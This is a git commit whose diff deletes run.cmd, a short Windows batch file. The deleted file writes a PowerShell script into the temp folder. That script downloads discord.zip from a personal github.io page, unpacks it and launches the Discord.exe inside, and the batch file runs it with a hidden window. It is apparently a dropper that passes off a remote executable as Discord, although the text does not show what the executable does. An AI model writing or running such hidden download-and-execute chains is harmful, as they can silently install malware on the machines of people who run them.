386c2062b68ff905b45fe075a2669b9b39e310ae
The Master Kitty <109026259+TheMasterKitty@users.noreply.github.com>
2022-12-21 20:12:18 -0500

    Delete run.cmd

--- run.cmd
+++
@@ -1,3 +0,0 @@
-cd %temp%
-echo "cd %temp%; mkdir pstemp; cd pstemp; Invoke-WebRequest -URI themasterkitty.github.io/randomstuffidk/discord.zip -OutFile discord.zip; Expand-Archive -Path discord.zip -DestinationPath discord; cd discord; start Discord.exe; exit" > run.ps1
-powershell.exe -windowstyle hidden -file %temp%\run.ps1 
